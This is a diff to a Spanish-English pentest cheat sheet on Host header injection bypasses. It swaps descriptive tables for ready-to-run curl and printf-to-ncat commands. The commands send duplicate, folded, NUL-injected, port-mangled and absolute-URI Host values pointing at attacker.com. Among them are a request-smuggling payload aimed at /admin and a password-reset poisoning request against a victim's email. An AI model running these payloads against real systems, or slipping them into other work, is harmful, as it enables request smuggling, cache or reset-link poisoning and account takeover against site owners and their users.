@@ -23,18 +23,12 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Doble Host | `Host: target.com\r\nHost: attacker.com` | RFC dice rejectar — algunos parsers laxos. |
-| Different parsers diff | Frontend toma 1ro, backend 2do (o viceversa) | Standard differential. |
-| First wins | Some servers procesan only first | Probe behavior. |
-| Last wins | Others procesan last | Differential. |
-| Concatenated | Backend concatenates con coma | Edge. |
-| Different case | `Host: target.com\r\nhost: attacker.com` | Case-insensitive but separate keys? |
-| Doble después de body | Headers después de empty line ignored | Edge. |
-| HRS combo | Smuggle one Host header en second request | Multi-vector. |
-| HTTP/2 :authority | `:authority: target.com` + `Host: attacker.com` | H2-specific differential. |
-| nginx 400 vs Apache | nginx reject duplicates, Apache laxer | Per-server. |
-| Spring tolerant | Spring frameworks tolerantes | Per-stack. |
-| Tomcat behavior | Tomcat parses both, uses last | Java specific. |
+| `printf 'GET / HTTP/1.1\r\nHost: target.com\r\nHost: attacker.com\r\n\r\n' \| ncat target.com 80` | Doble Host — frontend/backend toma distintos | Parsers laxos. |
+| `curl --http1.1 -H "Host: target.com" -H "Host: attacker.com" https://target/` (curl envía último) | Curl normaliza — frontend/backend differential test | Quick test. |
+| `printf 'GET / HTTP/1.1\r\nhost: attacker.com\r\nHost: target.com\r\n\r\n' \| ncat target 80` | Case differential — separate keys? | Header parser case behavior. |
+| `curl --http2 -H ":authority: target.com" -H "Host: attacker.com" https://target/` | HTTP/2 `:authority` vs Host differential | H2-specific. |
+| `printf 'GET / HTTP/1.1\r\nHost: target.com\r\nX-Forwarded-Host: attacker.com\r\n\r\n' \| ncat target 80` | Frontend uses Host, backend uses XFH | Reverse proxy desync. |
+| `printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: attacker.com\r\n\r\n' \| ncat target 80` | HRS combo smuggling Host | HRS + HHI. |
 ^hhi-bypass-multiple
 
 ___
@@ -43,16 +37,13 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Port injection en Host | `Host: target.com:1337` | Bypass simple Host validation. |
-| Port en URL | App generates `https://target.com:1337/path` | Reflected con weird port. |
-| Port 0 | `Host: target.com:0` | Some parsers interpret distinct. |
-| Negative port | `Host: target.com:-1` | Edge. |
-| Doble port | `Host: target.com:80:80` | Some apps reject, others accept. |
-| Trailing slash port | `Host: target.com:80/` | Path injection. |
-| Port-only | `Host: :1337` | Empty hostname. |
-| Combine con scheme | `Host: https://target.com:1337` | Absolute URL trick. |
-| Port que apunte a atacante | `Host: target.com:8080@attacker.com` | Userinfo trick. |
-| Tunnel port | If app forwards based on port | Edge routing. |
+| `curl -H "Host: target.com:1337" https://target/` | Bypass simple Host validation | Filter strict en hostname only. |
+| `curl -H "Host: target.com:0" https://target/` | Port 0 — parsers interpret distinto | Edge parser behavior. |
+| `curl -H "Host: target.com:-1" https://target/` | Negative port | Some parsers fail-open. |
+| `curl -H "Host: target.com:80:80" https://target/` | Doble port | Server parser tolerance. |
+| `curl -H "Host: :1337" https://target/` | Empty hostname con port | Edge case. |
+| `curl -H "Host: target.com:80@attacker.com" https://target/` | Userinfo trick — host real es attacker | Parser ignora userinfo. |
+| `curl -H "Host: https://attacker.com:1337" https://target/` | Absolute URL en Host | Some parsers accept. |
 ^hhi-bypass-port
 
 ___
@@ -61,18 +52,13 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Indented continuation (RFC obsolete) | `Host: target.com\r\n attacker.com` | Folded headers — obsolete pero algunos parsers aceptan. |
-| Tab indentation | `Host:\ttarget.com` | Tab char. |
-| Leading whitespace | `Host:  target.com` (multi-space) | Standard tolerated. |
-| Trailing whitespace | `Host: target.com  ` | Trailing strip varies. |
-| CR within Host | `Host: target.com\r attacker.com` | CRLF injection. |
-| LF within Host | `Host: target.com\nattacker.com` | Same. |
-| NUL byte | `Host: target.com\x00.attacker.com` | Truncation. |
-| Vertical tab | `Host: target.com\x0battacker.com` | Edge. |
-| Form feed | `Host: target.com\x0cattacker.com` | Edge. |
-| Spaces in hostname | `Host: target .com` | Some parsers strip. |
-| Mixed whitespace | `Host:\t target.com\t ` | Combined. |
-| `\r\n\r\n` truncate | `Host: target.com\r\n\r\nGET /admin` | HRS adjacent. |
+| `printf 'GET / HTTP/1.1\r\nHost: target.com\r\n attacker.com\r\n\r\n' \| ncat target 80` | Folded header (RFC obsolete) | Algunos parsers aceptan continuation. |
+| `printf 'GET / HTTP/1.1\r\nHost:\ttarget.com\r\n\r\n' \| ncat target 80` | Tab indentation | Whitespace tolerance. |
+| `printf 'GET / HTTP/1.1\r\nHost:  attacker.com\r\n\r\n' \| ncat target 80` | Multi-space leading | Standard tolerated. |
+| `printf 'GET / HTTP/1.1\r\nHost: target.com\rattacker.com\r\n\r\n' \| ncat target 80` | CR within Host (CRLF injection) | Header injection adjacent. |
+| `printf 'GET / HTTP/1.1\r\nHost: target.com\x00attacker.com\r\n\r\n' \| ncat target 80` | NUL byte truncation | Parser truncate-on-NUL. |
+| `printf 'GET / HTTP/1.1\r\nHost: target.com\x0battacker.com\r\n\r\n' \| ncat target 80` | Vertical tab | Edge whitespace. |
+| `printf 'GET / HTTP/1.1\r\nHost: target.com\r\n\r\nGET /admin HTTP/1.1\r\n\r\n' \| ncat target 80` | Double CRLF truncate (HRS adjacent) | Smuggling combo. |
 ^hhi-bypass-whitespace
 
 ___
@@ -81,16 +67,11 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Absolute URL form | `GET https://attacker.com/path HTTP/1.1` (absoluteURI) | Some servers prefer URL host over Host header. |
-| With Host header | `GET https://attacker.com/path HTTP/1.1\r\nHost: target.com` | Differential. |
-| Proxy-style request | RFC 7230 — proxies recibir absoluteURI | Backend behavior. |
-| HTTP/2 :path absolute | `:path: https://attacker.com/path` | H2 variant. |
-| Origin-form vs absolute | Most apps expect origin-form `/path` | Test absolute. |
-| URL with userinfo | `GET https://user:pass@attacker.com/ HTTP/1.1` | Userinfo. |
-| Encoded chars en URL | `GET https://attacker%2Ecom/ HTTP/1.1` | Encoded. |
-| Path traversal en URL | `GET https://target.com/../etc/passwd HTTP/1.1` | Combo. |
-| Multiple slashes | `GET https://target.com//admin HTTP/1.1` | Path normalization. |
-| Combine con Host | Different host en URL vs header | Differential. |
+| `printf 'GET https://attacker.com/path HTTP/1.1\r\nHost: target.com\r\n\r\n' \| ncat target 80` | absoluteURI form — backend usa URL host vs Host header | RFC 7230 proxy-style request. |
+| `printf 'GET https://user:pass@attacker.com/ HTTP/1.1\r\nHost: target.com\r\n\r\n' \| ncat target 80` | Userinfo en absolute URL | Parser confusion. |
+| `printf 'GET https://attacker%%2Ecom/ HTTP/1.1\r\nHost: target.com\r\n\r\n' \| ncat target 80` | Encoded chars en URL host | Decode-after-validate. |
+| `curl --http2 --request-target "https://attacker.com/" https://target/` | HTTP/2 :path absolute | H2 variant. |
+| `printf 'GET https://target.com//admin HTTP/1.1\r\nHost: target.com\r\n\r\n' \| ncat target 80` | Multiple slashes — path normalization differential | Path traversal-adjacent. |
 ^hhi-bypass-absolute
 
 ___
@@ -99,16 +80,13 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Path en Host | `Host: target.com/admin` | Some parsers split, others use full string. |
-| Slash en Host | `Host: target.com/path?injected=1` | Query injection. |
-| Fragment | `Host: target.com#evil` | Fragment in Host. |
-| Userinfo | `Host: user@target.com` | RFC technically allows. |
-| `@` separator abuse | `Host: target.com@attacker.com` | Userinfo confusion. |
-| Mixed encoding | `Host: target%2Ecom` | URL-encoded chars. |
-| `\` backslash | `Host: target.com\path` | Backslash en Host. |
-| Combine con base href | If reflected en `<base href="https://${HOST}">`, path included | XSS combo. |
-| Combine con Open Redirect | Path en Host → atacante's URL en redirect | Open Redirect chain. |
-| Cookie domain abuse | If cookie domain set from Host with path | Edge. |
+| `curl -H "Host: target.com/admin" https://target/` | Path en Host header | Parser split en `/`. |
+| `curl -H "Host: target.com/path?injected=1" https://target/` | Query injection en Host | Reflected en URL construct. |
+| `curl -H "Host: target.com#evil" https://target/` | Fragment en Host | Parser ignora fragment? |
+| `curl -H "Host: target.com@attacker.com" https://target/` | Userinfo confusion | Userinfo trick. |
+| `curl -H "Host: target%2Ecom" https://target/` | Encoded chars | URL decode. |
+| `curl -H 'Host: target.com\path' https://target/` | Backslash en Host | Backslash interpretation. |
+| `curl -X POST -H "Host: target.com#@attacker.com" -d "email=victim" https://target/forgot` | Combo HHI + Open Redirect via reflected base href | XSS-adjacent via reflection. |
 ^hhi-bypass-path
 
 ***
